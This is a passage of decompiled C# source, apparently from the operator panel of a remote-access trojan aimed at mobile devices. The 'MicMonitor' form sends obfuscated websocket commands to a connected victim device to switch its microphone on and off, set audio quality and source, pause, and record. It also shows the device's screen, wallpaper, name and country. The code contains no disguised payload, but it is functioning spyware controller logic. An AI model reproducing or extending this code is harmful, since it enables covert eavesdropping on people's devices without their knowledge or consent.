			"16000 (Hz)" => "16000", 
			"22050 (Hz)" => "22050", 
			"32000 (Hz)" => "32000", 
			"44100 (Hz)" => "44100", 
			_ => "8000", 
		};
		string serverNextKey = ServersMgr.GetServerNextKey(Btcli.Serverins.Address);
		string json = await MyServer.JoinServer(new VB_0024AnonymousType_3<string, string, string, string>("join", "0", "0", serverNextKey), Btcli.Serverins.MainhttpClient, Btcli.Serverins.Address);
		string value2 = Btcli.SecoundIDF;
		JObject jObject = JObject.Parse(json);
		if (jObject["Success"] != null)
		{
			_Closure_0024__65_002D0 arg = default(_Closure_0024__65_002D0);
			_Closure_0024__65_002D0 CS_0024_003C_003E8__locals7 = new _Closure_0024__65_002D0(arg);
			CS_0024_003C_003E8__locals7._0024VB_0024Me = this;
			CS_0024_003C_003E8__locals7._0024VB_0024Local_datastr = jObject["Success"].ToString().Trim('"');
			Debuger.Log_d("Cli IDF websock", CS_0024_003C_003E8__locals7._0024VB_0024Local_datastr);
			websockclient = new WebSocketClient(BTConst.livmicstr, Btcli.address, Btcli.Serverins);
			Thread thread = new Thread([SpecialName] () =>
			{
				CS_0024_003C_003E8__locals7._0024VB_0024Me.websockclient.Connect(CS_0024_003C_003E8__locals7._0024VB_0024Local_datastr);
			});
			thread.IsBackground = true;
			thread.Start();
			do
			{
				Thread.Sleep(1);
			}
			while (!websockclient.IsConnected);
			Debuger.Log_d("IDF Ready to use", CS_0024_003C_003E8__locals7._0024VB_0024Local_datastr);
			value2 = CS_0024_003C_003E8__locals7._0024VB_0024Local_datastr;
		}
		Dictionary<string, object> chatData = new Dictionary<string, object>
		{
			{ "msg", "mic" },
			{ "subc", "ON" },
			{ "Arate", value },
			{ "skidf", value2 },
			{
				"Asrc",
				combosrces.SelectedIndex.ToString()
			}
		};
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		startbtn.Enabled = false;
		stopbtn.Enabled = true;
	}

	private void stopbtn_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._6E716976, EXGuarder._2F71734A);
		dictionary.Add(EXGuarder._161E3C57, EXGuarder._153D4F39);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		startbtn.Enabled = true;
		stopbtn.Enabled = false;
		visualizer.StopVisualization();
		if (websockclient != null)
		{
			websockclient.Disconnect(BTConst.livcamstr, Btcli.address);
			websockclient = null;
		}
	}

	private void comboqultz_SelectedIndexChanged(object sender, EventArgs e)
	{
		string quality = EXGuarder._28335253;
		string left = comboqultz.Text;
		if (Operators.CompareString(left, EXGuarder._656B3D51, TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, EXGuarder._04484E68, TextCompare: false) != 0)
			{
				if (Operators.CompareString(left, EXGuarder._51372962, TextCompare: false) != 0)
				{
					if (Operators.CompareString(left, EXGuarder._0E261A1C, TextCompare: false) != 0)
					{
						if (Operators.CompareString(left, EXGuarder._23126E28, TextCompare: false) != 0)
						{
							if (Operators.CompareString(left, EXGuarder._694B3F4E, TextCompare: false) != 0)
							{
								return;
							}
							 quality = EXGuarder._7336562A;
						}
						else
						{
							 quality = EXGuarder._20174302;
						}
					}
					else
					{
						 quality = EXGuarder._6E60121A;
					}
				}
				else
				{
					 quality = EXGuarder._586A3024;
				}
			}
			else
			{
				 quality = EXGuarder._0B6E5769;
			}
		}
		else
		{
			 quality = EXGuarder._40197655;
		}
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._3A256F03, EXGuarder._0D310003);
		dictionary.Add(EXGuarder._312F6713, EXGuarder._601D4430);
		dictionary.Add(EXGuarder._5C033539, quality);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void recordbtn_Click_1(object sender, EventArgs e)
	{
		if (Operators.CompareString(recordbtn.TagString, EXGuarder._501D5400, TextCompare: false) == 0)
		{
			recordbtn.TagString = EXGuarder._12032756;
			recordbtn.ForeColor = Color.Lime;
			progressbaradio.ForeColor = Color.Lime;
			recordbtn.Symbol = 61713;
			recordbtn.Text = stoptext;
		}
		else
		{
			recordbtn.TagString = EXGuarder._501D5400;
			recordbtn.Symbol = 61744;
			recordbtn.Text = recotext;
			recordbtn.ForeColor = Color.White;
			progressbaradio.ForeColor = Color.FromArgb(30, 136, 229);
		}
	}

	private void DrakeUIButtonIcon10_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._1D755F3B, EXGuarder._5D682017);
		dictionary.Add(EXGuarder._4C39126C, EXGuarder._0F086124);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		visualizer.StopVisualization();
		pausebtn.Enabled = false;
		continuebtn.Enabled = true;
	}

	private void DrakeUIButtonIcon11_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._0C64053F, EXGuarder._00571327);
		dictionary.Add(EXGuarder._020E2818, EXGuarder._22783243);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		pausebtn.Enabled = true;
		continuebtn.Enabled = false;
	}

	private void combosrces_SelectedIndexChanged(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._74696B0E, EXGuarder._52790D03);
		dictionary.Add(EXGuarder._2B4E4F67, EXGuarder._55612E05);
		dictionary.Add(EXGuarder._1E512728, combosrces.SelectedIndex.ToString());
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void statetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			if (Btcli.isConnected)
			{
				myscr.Image = Btcli.screen;
				myico.Image = Btcli.wallpaper;
				mytitle.Text = BTConst.Microphonestr + EXGuarder._7500742A + Btcli.name + EXGuarder._7500742A + Btcli.country;
			}
			else
			{
				myico.Image = Resources.no_con;
				myscr.Image = null;
				mytitle.Text = BTConst.Microphonestr + EXGuarder._7500742A + BTConst.Disconnectedstr;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void MicMonitor_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (websockclient != null)
		{
			websockclient.Disconnect(BTConst.livmicstr, Btcli.address);
			websockclient = null;
		}
	}
}
